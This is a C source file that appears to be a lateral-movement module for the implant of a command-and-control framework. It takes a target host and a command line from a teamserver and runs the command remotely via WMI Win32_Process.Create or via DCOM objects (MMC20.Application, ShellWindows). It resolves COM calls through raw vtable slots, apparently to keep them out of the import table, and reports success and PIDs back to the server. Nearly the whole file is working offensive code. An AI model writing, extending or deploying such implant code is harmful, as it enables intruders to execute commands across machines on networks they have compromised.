/*
 * Command_Lateral.c  -  lateral movement commands: wmi exec, dcom exec
 *
 * Sub-commands (defined in core/Command.h):
 *   DEMON_LATERAL_WMI_EXEC  (1)  -- run a command on a remote host via WMI Win32_Process.Create
 *   DEMON_LATERAL_DCOM_EXEC (2)  -- run a command on a remote host via DCOM (MMC20 or ShellWindows)
 *
 * All COM interfaces are resolved dynamically via vtable slot indexing;
 * no COM import table entries are used.
 *
 * Parser layout (teamserver sends fields in this order):
 *   SubCommand  INT32
 *   Target      WSTRING   (remote hostname or IP)
 *   Command     WSTRING   (command line to execute)
 *   Method      INT32     (DCOM only: 1=MMC20, 2=ShellWindows)
 *
 * Package layout sent back:
 *   SubCommand  INT32
 *   Success     INT32   (1 = executed, 0 = failed)
 *   PID         INT32   (WMI only: PID from Win32_Process.Create; 0 otherwise)
 *
 * Vtable slot reference (Windows SDK, 0-based from IUnknown):
 *   IWbemLocator   : 0=QI, 1=AddRef, 2=Release, 3=ConnectServer
 *   IWbemServices  : 0-2=IUnknown, 3=OpenNamespace, 4=RequestChallenge,
 *                    5=WBEMLogin, 6=GetObject, 7=GetObjectAsync, ...
 *                    20=ExecQuery, 21=ExecQueryAsync, 22=ExecNotificationQuery,
 *                    23=ExecNotificationQueryAsync, 24=ExecMethod
 *   IWbemClassObject: 0-2=IUnknown, 3=GetQualifierSet, 4=Get, 5=Put,
 *                    6=Delete, 7=GetNames, 8=BeginEnumeration, 9=Next,
 *                    10=EndEnumeration, 11=GetPropertyQualifierSet,
 *                    12=Clone, 13=GetObjectText, 14=SpawnDerivedClass,
 *                    15=SpawnInstance, ...
 *   IDispatch      : 0=QI, 1=AddRef, 2=Release, 3=GetTypeInfoCount,
 *                    4=GetTypeInfo, 5=GetIDsOfNames, 6=Invoke
 */

#include <Demon.h>
#include <common/Macros.h>
#include <core/Command.h>
#include <core/Package.h>
#include <core/MiniStd.h>
#include <core/Parser.h>
#include <commands/Command_Lateral.h>

/* -------------------------------------------------------------------------
 * COM vtable slot constants
 * ---------------------------------------------------------------------- */
#define VTBL_IUNKNOWN_RELEASE       2

/* IWbemLocator slots */
#define VTBL_WBEMLOCATOR_CONNECTSERVER  3

/* IWbemServices slots */
#define VTBL_WBEMSERVICES_GETOBJECT     6
#define VTBL_WBEMSERVICES_EXECMETHOD   24

/* IWbemClassObject slots */
#define VTBL_WBEMCLASSOBJ_GET           4
#define VTBL_WBEMCLASSOBJ_PUT           5
#define VTBL_WBEMCLASSOBJ_SPAWNINSTANCE 15

/* IDispatch slots */
#define VTBL_IDISPATCH_GETIDSOFNAMES    5
#define VTBL_IDISPATCH_INVOKE           6

/* -------------------------------------------------------------------------
 * Minimal forward COM types
 * All COM objects are accessed as PVOID; vtable calls go through
 * ((PFN_xxx)(((PVOID**)obj)[0][slot]))(obj, ...) to avoid struct layout bugs.
 * ---------------------------------------------------------------------- */

/* IWbemLocator::ConnectServer */
typedef HRESULT ( WINAPI *PFN_ConnectServer )(
    PVOID pThis, BSTR strNetworkResource, BSTR strUser, BSTR strPassword,
    BSTR strLocale, LONG lSecurityFlags, BSTR strAuthority,
    PVOID pCtx, PVOID *ppNamespace );

/* IWbemServices::GetObject */
typedef HRESULT ( WINAPI *PFN_WbemGetObject )(
    PVOID pThis, BSTR strObjectPath, LONG lFlags, PVOID pCtx,
    PVOID *ppObject, PVOID *ppCallResult );

/* IWbemServices::ExecMethod */
typedef HRESULT ( WINAPI *PFN_ExecMethod )(
    PVOID pThis, BSTR strObjectPath, BSTR strMethodName, LONG lFlags,
    PVOID pCtx, PVOID pInParams, PVOID *ppOutParams, PVOID *ppCallResult );

/* CIMTYPE is defined in wbemcli.h which MinGW does not ship.
 * It is simply a LONG per the Windows SDK. */
#ifndef CIMTYPE_DEFINED
#define CIMTYPE_DEFINED
typedef LONG CIMTYPE;
#endif

/* IWbemClassObject::Put */
typedef HRESULT ( WINAPI *PFN_WbemPut )(
    PVOID pThis, LPCWSTR wszName, LONG lFlags, VARIANT *pVal, CIMTYPE Type );

/* IWbemClassObject::Get */
typedef HRESULT ( WINAPI *PFN_WbemGet )(
    PVOID pThis, LPCWSTR wszName, LONG lFlags, VARIANT *pVal,
    CIMTYPE *pType, LONG *plFlavor );

/* IWbemClassObject::SpawnInstance */
typedef HRESULT ( WINAPI *PFN_SpawnInstance )(
    PVOID pThis, LONG lFlags, PVOID *ppNewInstance );

/* IUnknown::Release */
typedef ULONG ( WINAPI *PFN_Release )( PVOID pThis );

/* IDispatch::GetIDsOfNames */
typedef HRESULT ( WINAPI *PFN_GetIDsOfNames )(
    PVOID pThis, REFIID riid, OLECHAR **rgszNames, UINT cNames,
    LCID lcid, DISPID *rgDispId );

/* IDispatch::Invoke */
typedef HRESULT ( WINAPI *PFN_Invoke )(
    PVOID pThis, DISPID dispIdMember, REFIID riid, LCID lcid,
    WORD wFlags, DISPPARAMS *pDispParams, VARIANT *pVarResult,
    EXCEPINFO *pExcepInfo, UINT *puArgErr );

/* -------------------------------------------------------------------------
 * Helper macro: call a vtable slot on a COM object.
 * COM object layout: obj[0] = pointer to vtable array of PVOIDs.
 * ---------------------------------------------------------------------- */
#define COM_VTBL_CALL( RetType, Obj, Slot ) \
    ( ( RetType )( ( ( PVOID** )( Obj ) )[0][ (Slot) ] ) )

/* -------------------------------------------------------------------------
 * GUIDs (compile-time constants; no CoInitialize-dependent resolution needed)
 * ---------------------------------------------------------------------- */

/* WMI: CLSID_WbemLocator  {4590f811-1d3a-11d0-891f-00aa004b2e24} */
static const CLSID CLSID_WbemLocator = {
    0x4590f811, 0x1d3a, 0x11d0,
    { 0x89, 0x1f, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24 }
};

/* WMI: IID_IWbemLocator  {dc12a687-737f-11cf-884d-00aa004b2e24} */
static const IID IID_IWbemLocator = {
    0xdc12a687, 0x737f, 0x11cf,
    { 0x88, 0x4d, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24 }
};

/* DCOM: CLSID_MMC20.Application  {49B2791A-B1AE-4C90-9B8E-E860BA07F889} */
static const CLSID CLSID_MMC20 = {
    0x49B2791A, 0xB1AE, 0x4C90,
    { 0x9B, 0x8E, 0xE8, 0x60, 0xBA, 0x07, 0xF8, 0x89 }
};

/* DCOM: CLSID_ShellWindows  {9BA05972-F6A8-11CF-A442-00A0C90A8F39} */
static const CLSID CLSID_ShellWindows = {
    0x9BA05972, 0xF6A8, 0x11CF,
    { 0xA4, 0x42, 0x00, 0xA0, 0xC9, 0x0A, 0x8F, 0x39 }
};

/* IID_NULL / IID_IUnknown  {00000000-0000-0000-C000-000000000046} */
static const IID IID_NULL_Local = {
    0x00000000, 0x0000, 0x0000,
    { 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 }
};

/* IID_IDispatch  {00020400-0000-0000-C000-000000000046} */
static const IID IID_IDispatch_Local = {
    0x00020400, 0x0000, 0x0000,
    { 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 }
};

/* -------------------------------------------------------------------------
 * BSTR helpers  (no oleaut32 SysAllocString dependency)
 *
 * A BSTR is a pointer to WCHAR data preceded by a 4-byte byte-count.
 * We allocate [sizeof(DWORD) + byte_len + sizeof(WCHAR)] via MmHeapAlloc,
 * write the length, copy the data, and return the pointer to the data part.
 * BstrFreeLocal walks back 4 bytes to free the whole block.
 * ---------------------------------------------------------------------- */

/* BstrAllocLocal - build a BSTR from a NUL-terminated WCHAR string.
 * Returns BSTR (pointer into the allocation), or NULL on OOM or NULL src. */
static BSTR BstrAllocLocal( PWCHAR Src )
{
    SIZE_T CharLen  = { 0 };
    SIZE_T ByteLen  = { 0 };
    PBYTE  Block    = { 0 };
    PDWORD LenField = { 0 };

    if ( !Src ) {
        return NULL;
    }

    CharLen  = StringLengthW( Src );
    ByteLen  = CharLen * sizeof( WCHAR );

    /* Allocate: 4-byte length prefix + data + NUL terminator */
    Block = (PBYTE) MmHeapAlloc( sizeof( DWORD ) + ByteLen + sizeof( WCHAR ) );
    if ( !Block ) {
        return NULL;
    }

    /* Write byte-count prefix */
    LenField  = (PDWORD) Block;
    *LenField = (DWORD)  ByteLen;

    /* Copy WCHAR data including the NUL terminator */
    MemCopy( Block + sizeof( DWORD ), Src, ByteLen + sizeof( WCHAR ) );

    /* BSTR points past the 4-byte prefix */
    return (BSTR)( Block + sizeof( DWORD ) );
}

/* BstrFreeLocal - release a BSTR allocated with BstrAllocLocal. */
static VOID BstrFreeLocal( BSTR Bstr )
{
    if ( Bstr ) {
        MmHeapFree( (PVOID)( (PBYTE) Bstr - sizeof( DWORD ) ) );
    }
}

/* ComRelease - safely release a COM interface pointer (if non-NULL). */
static VOID ComRelease( PVOID *ppObj )
{
    if ( ppObj && *ppObj ) {
        COM_VTBL_CALL( PFN_Release, *ppObj, VTBL_IUNKNOWN_RELEASE )( *ppObj );
        *ppObj = NULL;
    }
}

/* -------------------------------------------------------------------------
 * WmiBuildNamespace - write \\Target\root\cimv2 into a caller buffer.
 * Buf must hold at least 256 WCHARs.
 * ---------------------------------------------------------------------- */
static VOID WmiBuildNamespace( PWCHAR Buf, PWCHAR Target )
{
    Buf[0] = L'\\';
    Buf[1] = L'\\';
    Buf[2] = L'\0';
    StringConcatW( Buf, Target );
    StringConcatW( Buf, L"\\root\\cimv2" );
}

/* -------------------------------------------------------------------------
 * LateralWmiExec  -  execute Command on Target via WMI Win32_Process.Create
 *
 * Writes two INT32s to Package: Success(1/0), PID (0 if unavailable).
 * ---------------------------------------------------------------------- */
static VOID LateralWmiExec(
    PPACKAGE Package,
    PWCHAR   Target,
    PWCHAR   Command
) {
    HRESULT  Hr            = E_FAIL;
    PVOID    pLoc          = NULL;   /* IWbemLocator        */
    PVOID    pSvc          = NULL;   /* IWbemServices       */
    PVOID    pClass        = NULL;   /* IWbemClassObject (class definition) */
    PVOID    pInParams     = NULL;   /* IWbemClassObject (in-param instance) */
    PVOID    pOutParams    = NULL;   /* IWbemClassObject (out-param result) */
    BSTR     bsNamespace   = NULL;
    BSTR     bsClass       = NULL;
    BSTR     bsMethod      = NULL;
    BSTR     bsCommand     = NULL;
    WCHAR    NsBuf[256]    = { 0 };
    BOOL     Initialised   = FALSE;
    DWORD    Pid           = 0;
    DWORD    Success       = 0;
    VARIANT  vCmd          = { 0 };
    VARIANT  vPid          = { 0 };

    /* Guard: required COM pointers must have been resolved at startup */
    if ( !Instance->Win32.CoInitializeEx  ||
         !Instance->Win32.CoCreateInstance ||
         !Instance->Win32.CoUninitialize  )
    {
        PUTS( "LateralWmiExec - COM pointers not resolved" )
        goto WMI_OUT;
    }

    /* CoInitializeEx */
    Hr = Instance->Win32.CoInitializeEx( NULL, COINIT_MULTITHREADED );
    if ( FAILED( Hr ) && Hr != RPC_E_CHANGED_MODE ) {
        PRINTF( "LateralWmiExec CoInitializeEx failed: 0x%x\n", Hr )
        goto WMI_OUT;
    }
    Initialised = TRUE;

    /* Create IWbemLocator */
    Hr = Instance->Win32.CoCreateInstance(
        &CLSID_WbemLocator,
        NULL,
        CLSCTX_INPROC_SERVER,
        &IID_IWbemLocator,
        &pLoc
    );
    if ( FAILED( Hr ) || !pLoc ) {
        PRINTF( "LateralWmiExec CoCreateInstance failed: 0x%x\n", Hr )
        goto WMI_OUT;
    }

    /* Build namespace BSTR: \\<Target>\root\cimv2 */
    WmiBuildNamespace( NsBuf, Target );
    bsNamespace = BstrAllocLocal( NsBuf );
    if ( !bsNamespace ) {
        PUTS( "LateralWmiExec bsNamespace OOM" )
        goto WMI_OUT;
    }

    /* ConnectServer -> IWbemServices */
    Hr = COM_VTBL_CALL( PFN_ConnectServer, pLoc, VTBL_WBEMLOCATOR_CONNECTSERVER )(
        pLoc,
        bsNamespace,   /* network resource  */
        NULL,          /* username (current token) */
        NULL,          /* password */
        NULL,          /* locale */
        0,             /* security flags */
        NULL,          /* authority */
        NULL,          /* context */
        &pSvc
    );
    if ( FAILED( Hr ) || !pSvc ) {
        PRINTF( "LateralWmiExec ConnectServer failed: 0x%x\n", Hr )
        goto WMI_OUT;
    }

    /* GetObject("Win32_Process") -> IWbemClassObject class definition */
    bsClass = BstrAllocLocal( L"Win32_Process" );
    if ( !bsClass ) {
        PUTS( "LateralWmiExec bsClass OOM" )
        goto WMI_OUT;
    }

    Hr = COM_VTBL_CALL( PFN_WbemGetObject, pSvc, VTBL_WBEMSERVICES_GETOBJECT )(
        pSvc,
        bsClass,
        0,      /* WBEM_FLAG_RETURN_WBEM_COMPLETE */
        NULL,   /* context */
        &pClass,
        NULL    /* call result */
    );
    if ( FAILED( Hr ) || !pClass ) {
        PRINTF( "LateralWmiExec GetObject failed: 0x%x\n", Hr )
        goto WMI_OUT;
    }

    /* SpawnInstance -> pInParams (in-parameter object for Create) */
    Hr = COM_VTBL_CALL( PFN_SpawnInstance, pClass, VTBL_WBEMCLASSOBJ_SPAWNINSTANCE )(
        pClass,
        0,
        &pInParams
    );
    if ( FAILED( Hr ) || !pInParams ) {
        PRINTF( "LateralWmiExec SpawnInstance failed: 0x%x\n", Hr )
        goto WMI_OUT;
    }

    /* Put CommandLine property on the in-param object */
    bsCommand       = BstrAllocLocal( Command );
    if ( !bsCommand ) {
        PUTS( "LateralWmiExec bsCommand OOM" )
        goto WMI_OUT;
    }

    vCmd.vt      = VT_BSTR;
    vCmd.bstrVal = bsCommand;   /* bsCommand lifetime spans the Put call */

    Hr = COM_VTBL_CALL( PFN_WbemPut, pInParams, VTBL_WBEMCLASSOBJ_PUT )(
        pInParams,
        L"CommandLine",
        0,
        &vCmd,
        0   /* CIM_EMPTY - WMI infers the type */
    );
    if ( FAILED( Hr ) ) {
        PRINTF( "LateralWmiExec Put CommandLine failed: 0x%x\n", Hr )
        goto WMI_OUT;
    }

    /* ExecMethod: Win32_Process.Create */
    bsMethod = BstrAllocLocal( L"Create" );
    if ( !bsMethod ) {
        PUTS( "LateralWmiExec bsMethod OOM" )
        goto WMI_OUT;
    }

    Hr = COM_VTBL_CALL( PFN_ExecMethod, pSvc, VTBL_WBEMSERVICES_EXECMETHOD )(
        pSvc,
        bsClass,     /* object path: "Win32_Process" */
        bsMethod,    /* method: "Create" */
        0,
        NULL,
        pInParams,
        &pOutParams,
        NULL
    );
    if ( FAILED( Hr ) ) {
        PRINTF( "LateralWmiExec ExecMethod failed: 0x%x\n", Hr )
        goto WMI_OUT;
    }

    Success = 1;

    /* Read ProcessId from out-params (optional; graceful on failure) */
    if ( pOutParams ) {
        Hr = COM_VTBL_CALL( PFN_WbemGet, pOutParams, VTBL_WBEMCLASSOBJ_GET )(
            pOutParams,
            L"ProcessId",
            0,
            &vPid,
            NULL,
            NULL
        );
        if ( SUCCEEDED( Hr ) && vPid.vt == VT_I4 ) {
            Pid = (DWORD) vPid.lVal;
        }
    }

WMI_OUT:
    ComRelease( &pOutParams );
    ComRelease( &pInParams  );
    ComRelease( &pClass     );
    ComRelease( &pSvc       );
    ComRelease( &pLoc       );

    if ( bsNamespace ) { BstrFreeLocal( bsNamespace ); bsNamespace = NULL; }
    if ( bsClass     ) { BstrFreeLocal( bsClass );     bsClass     = NULL; }
    if ( bsMethod    ) { BstrFreeLocal( bsMethod );    bsMethod    = NULL; }
    if ( bsCommand   ) { BstrFreeLocal( bsCommand );   bsCommand   = NULL; }

    if ( Initialised ) {
        Instance->Win32.CoUninitialize();
    }

    PackageAddInt32( Package, (UINT32) Success );
    PackageAddInt32( Package, (UINT32) Pid     );
}

/* -------------------------------------------------------------------------
 * LateralDcomExec  -  execute Command on Target via DCOM
 *
 * Method 1 (MMC20.Application):
 *   CoCreateInstanceEx(CLSID_MMC20, COSERVERINFO=Target) -> IDispatch
 *   -> GetIDsOfNames("ExecuteShellCommand") -> Invoke
 *
 * Method 2 (ShellWindows):
 *   CoCreateInstanceEx(CLSID_ShellWindows, COSERVERINFO=Target) -> IDispatch
 *   -> GetIDsOfNames("ShellExecute") -> Invoke
 *
 * Writes one INT32 to Package: Success (1/0).
 * ---------------------------------------------------------------------- */
static VOID LateralDcomExec(
    PPACKAGE Package,
    PWCHAR   Target,
    PWCHAR   Command,
    DWORD    Method
) {
    HRESULT       Hr             = E_FAIL;
    COSERVERINFO  SrvInfo        = { 0 };
    MULTI_QI      Mqi            = { 0 };
    IID           DispIid        = { 0 };
    PVOID         pDisp          = NULL;   /* IDispatch */
    BSTR          bsCommand      = NULL;
    BOOL          Initialised    = FALSE;
    DWORD         Success        = 0;
    DISPID        DispId         = 0;
    OLECHAR      *MethodName     = NULL;
    DISPPARAMS    Dp             = { 0 };
    VARIANT       vArg           = { 0 };
    VARIANT       vResult        = { 0 };
    const CLSID  *pClsid         = NULL;

    /* Guard: required COM pointers must be resolved */
    if ( !Instance->Win32.CoInitializeEx    ||
         !Instance->Win32.CoCreateInstanceEx ||
         !Instance->Win32.CoUninitialize    )
    {
        PUTS( "LateralDcomExec - COM pointers not resolved" )
        PackageAddInt32( Package, 0 );  /* Success */
        PackageAddInt32( Package, 0 );  /* PID (none for DCOM) */
        return;
    }

    /* CoInitializeEx */
    Hr = Instance->Win32.CoInitializeEx( NULL, COINIT_MULTITHREADED );
    if ( FAILED( Hr ) && Hr != RPC_E_CHANGED_MODE ) {
        PRINTF( "LateralDcomExec CoInitializeEx failed: 0x%x\n", Hr )
        PackageAddInt32( Package, 0 );  /* Success */
        PackageAddInt32( Package, 0 );  /* PID (none for DCOM) */
        return;
    }
    Initialised = TRUE;

    /* Select CLSID and method name based on method argument */
    if ( Method == 2 ) {
        pClsid     = &CLSID_ShellWindows;
        MethodName = L"ShellExecute";
    } else {
        /* Default to MMC20 for method == 1 or any other value */
        pClsid     = &CLSID_MMC20;
        MethodName = L"ExecuteShellCommand";
    }

    /* Build COSERVERINFO pointing at the remote target */
    SrvInfo.pwszName = Target;   /* COSERVERINFO::pwszName is LPWSTR */

    /* Prepare MULTI_QI for IDispatch */
    MemCopy( &DispIid, &IID_IDispatch_Local, sizeof( IID ) );
    Mqi.pIID = &DispIid;
    Mqi.pItf = NULL;
    Mqi.hr   = S_OK;

    /* CoCreateInstanceEx on the remote machine */
    Hr = Instance->Win32.CoCreateInstanceEx(
        pClsid,
        NULL,
        CLSCTX_REMOTE_SERVER,
        &SrvInfo,
        1,
        &Mqi
    );
    if ( FAILED( Hr ) || FAILED( Mqi.hr ) || !Mqi.pItf ) {
        PRINTF( "LateralDcomExec CoCreateInstanceEx failed: outer=0x%x qi=0x%x\n", Hr, Mqi.hr )
        /* Release any partial QI result to prevent interface leak */
        if ( Mqi.pItf ) { ComRelease( (PVOID *) &Mqi.pItf ); }
        goto DCOM_OUT;
    }
    pDisp = Mqi.pItf;

    /* GetIDsOfNames for the chosen method string */
    Hr = COM_VTBL_CALL( PFN_GetIDsOfNames, pDisp, VTBL_IDISPATCH_GETIDSOFNAMES )(
        pDisp,
        (REFIID) &IID_NULL_Local,   /* must be IID_NULL */
        &MethodName,
        1,
        LOCALE_SYSTEM_DEFAULT,
        &DispId
    );
    if ( FAILED( Hr ) ) {
        PRINTF( "LateralDcomExec GetIDsOfNames %S failed: 0x%x\n", MethodName, Hr )
        goto DCOM_OUT;
    }

    /* Build a single-argument DISPPARAMS with the command BSTR */
    bsCommand = BstrAllocLocal( Command );
    if ( !bsCommand ) {
        PUTS( "LateralDcomExec bsCommand OOM" )
        goto DCOM_OUT;
    }

    vArg.vt      = VT_BSTR;
    vArg.bstrVal = bsCommand;

    Dp.rgvarg            = &vArg;
    Dp.cArgs             = 1;
    Dp.cNamedArgs        = 0;
    Dp.rgdispidNamedArgs = NULL;

    /* Invoke the method */
    Hr = COM_VTBL_CALL( PFN_Invoke, pDisp, VTBL_IDISPATCH_INVOKE )(
        pDisp,
        DispId,
        (REFIID) &IID_NULL_Local,   /* must be IID_NULL */
        LOCALE_SYSTEM_DEFAULT,
        DISPATCH_METHOD,
        &Dp,
        &vResult,
        NULL,
        NULL
    );
    if ( FAILED( Hr ) ) {
        PRINTF( "LateralDcomExec Invoke %S failed: 0x%x\n", MethodName, Hr )
        /* Some fire-and-forget DCOM methods return non-S_OK on success;
         * treat any DCOM call that does not crash as a partial success. */
    } else {
        Success = 1;
    }

DCOM_OUT:
    if ( bsCommand ) {
        BstrFreeLocal( bsCommand );
        bsCommand = NULL;
    }

    ComRelease( &pDisp );

    if ( Initialised ) {
        Instance->Win32.CoUninitialize();
    }

    PackageAddInt32( Package, (UINT32) Success );
    PackageAddInt32( Package, 0 );   /* PID - DCOM does not return a remote PID */
}

/* -------------------------------------------------------------------------
 * CommandLateral  -  dispatcher for all lateral movement sub-commands
 * ---------------------------------------------------------------------- */

/* CommandLateral - parse sub-command field, dispatch to WMI or DCOM handler */
VOID CommandLateral( PPARSER Parser )
{
    PPACKAGE Package    = { 0 };
    DWORD    SubCommand = { 0 };
    PWCHAR   Target     = { 0 };
    PWCHAR   Command    = { 0 };
    UINT32   TargetLen  = 0;
    UINT32   CommandLen = 0;

    PUTS( "CommandLateral" )

    Package    = PackageCreate( DEMON_COMMAND_LATERAL );
    SubCommand = (DWORD) ParserGetInt32( Parser );

    /* Echo sub-command back to teamserver for routing */
    PackageAddInt32( Package, SubCommand );

    /* Parse shared fields: Target and Command */
    Target  = ParserGetWString( Parser, &TargetLen );
    Command = ParserGetWString( Parser, &CommandLen );

    /* Validate non-empty Target */
    if ( !Target || TargetLen == 0 ) {
        PUTS( "CommandLateral - missing Target string" )
        PackageAddInt32( Package, 0 );
        PackageAddInt32( Package, 0 );
        PackageTransmit( Package );
        return;
    }

    /* Validate non-empty Command */
    if ( !Command || CommandLen == 0 ) {
        PUTS( "CommandLateral - missing Command string" )
        PackageAddInt32( Package, 0 );
        PackageAddInt32( Package, 0 );
        PackageTransmit( Package );
        return;
    }

    switch ( SubCommand )
    {
        case DEMON_LATERAL_WMI_EXEC:
        {
            PUTS( "CommandLateral - WMI exec" )
            LateralWmiExec( Package, Target, Command );
            break;
        }

        case DEMON_LATERAL_DCOM_EXEC:
        {
            /* DCOM exec has an extra Method field (1=MMC20, 2=ShellWindows) */
            DWORD Method = (DWORD) ParserGetInt32( Parser );
            PRINTF( "CommandLateral - DCOM exec method=%d\n", Method )
            LateralDcomExec( Package, Target, Command, Method );
            break;
        }

        default:
        {
            PRINTF( "CommandLateral - unknown sub-command %d\n", SubCommand )
            PackageAddInt32( Package, 0 );
            PackageAddInt32( Package, 0 );
            break;
        }
    }

    /* Single PackageTransmit at the end of the dispatcher */
    PackageTransmit( Package );
}
